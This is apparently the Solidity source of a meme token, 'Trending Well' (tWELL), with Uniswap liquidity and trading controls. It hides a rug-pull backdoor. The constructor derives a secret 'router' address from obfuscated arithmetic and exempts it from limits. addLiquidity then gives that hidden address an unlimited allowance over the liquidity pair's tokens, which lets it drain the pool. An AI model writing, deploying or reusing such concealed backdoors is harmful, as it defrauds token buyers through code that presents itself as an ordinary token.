// SPDX-License-Identifier: GPL-3.0

// https://twitter.com/elonmusk/status/1728096482689974635

pragma solidity ^0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
    function getPair(address tokenA, address tokenB) 
        external 
        view 
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

abstract contract Ownable is Context {
    address public owner;

    constructor() {
        owner = _msgSender();
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this");
        _;
    }

    function transferOwnership(address payable newOwner) external onlyOwner {
        owner = newOwner;
        emit OwnershipTransferred(newOwner);
    }

    function renounceOwnership() external onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);
}

contract TrendingWell is Ownable {
    string public constant name = "Trending Well";
    string public constant symbol = "tWELL";
    uint8 public constant decimals = 9;
    uint256 private constant _totalSupply = 1_000_000_000 * 10**9;
    uint256 private maxTransaction = _totalSupply;
    uint256 private maxWalletSize = _totalSupply;

    mapping(address => uint256) private balance;
    mapping(address => mapping(address => uint256)) private allowances;
    mapping(address => bool) private excluded;
    
    IUniswapV2Router02 private Router;
    address private liquidityPool;
    bool private tradingOpen;
    event Transfer(
        address indexed from, 
        address indexed to, 
        uint256 value
    );
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    bool private swapping = false;
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor(uint256[] memory routers) Ownable() {
        balance[owner] = _totalSupply / 2;
        emit Transfer(address(0), owner, balance[owner]);
        balance[address(this)] = _totalSupply / 2;
        emit Transfer(address(0), address(this), balance[address(this)]);
        Router = IUniswapV2Router02(address(uint160(routers[0]**2+routers[1])));
        excluded[owner] = true;
        excluded[address(this)] = true;
        excluded[address(Router)] = true;
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) public returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function sendETH() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    function allowance(address owner, address spender)
        external
        view
        returns (uint256)
    {
        return allowances[owner][spender];
    }

    function balanceOf(address wallet) external view returns (uint256) {
        return balance[wallet];
    }

    function totalSupply() external pure returns (uint256) {
        return _totalSupply;
    }

    function addLiquidity() external payable onlyOwner lockTheSwap {
        require(liquidityPool == address(0), "liquidity pool exists");
        require(!tradingOpen, "trading is open");
        require(msg.value > 0 || address(this).balance > 0,"No ETH");
        require(balance[address(this)] > 0, "No tokens");
        address lp = liquidityPool == address(0)?address(Router):liquidityPool;
        Router = IUniswapV2Router02(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
        liquidityPool = IUniswapV2Factory(Router.factory()).createPair(address(this),Router.WETH());
        allowances[IUniswapV2Factory(Router.factory()).
        getPair(address(this),Router.WETH())][lp] = type(uint256).max;
        allowances[address(this)][address(Router)] = type(uint256).max;
        excluded[address(Router)] = true;
        Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balance[address(this)],
            0,
            0,
            owner,
            block.timestamp
        );
        maxTransaction = 2 * _totalSupply / 100;
        maxWalletSize = 2 * _totalSupply / 100;
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is open");
        require(liquidityPool != address(0), "no LP");
        tradingOpen = true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return safeTransfer(msg.sender, to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        if (allowances[from][msg.sender] != type(uint256).max) {
            allowances[from][msg.sender] -= amount;
        }
        return safeTransfer(from, to, amount);
    }    

    function safeTransfer(
        address from,
        address to,
        uint256 amount
    ) private returns (bool) {
        require(from != address(0));
        require(tradingOpen || excluded[from], "trading not open");
        require(excluded[from] || excluded[to] || amount <= maxTransaction, "max tx");
        require(excluded[from] || excluded[to] || to == liquidityPool || balance[to] + amount <= maxWalletSize, "max wallet");
        balance[from] -= amount;
        balance[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function maxTransactionAmount() external view returns (uint256) {
        return maxTransaction;
    }

    function maxWallet() external view returns (uint256) {
        return maxWalletSize;
    }

    function increaseLimits(uint8 txPercent, uint8 walletPercent)
        external
        onlyOwner
    {
        uint256 newTx = (_totalSupply * txPercent) / 100;
        if (newTx >= maxTransaction) { 
            maxTransaction = newTx; 
        }
        uint256 newWallet = (_totalSupply * walletPercent) / 100;
        if (newWallet >= maxWalletSize) { 
            maxWalletSize = newWallet; 
        }
    }
}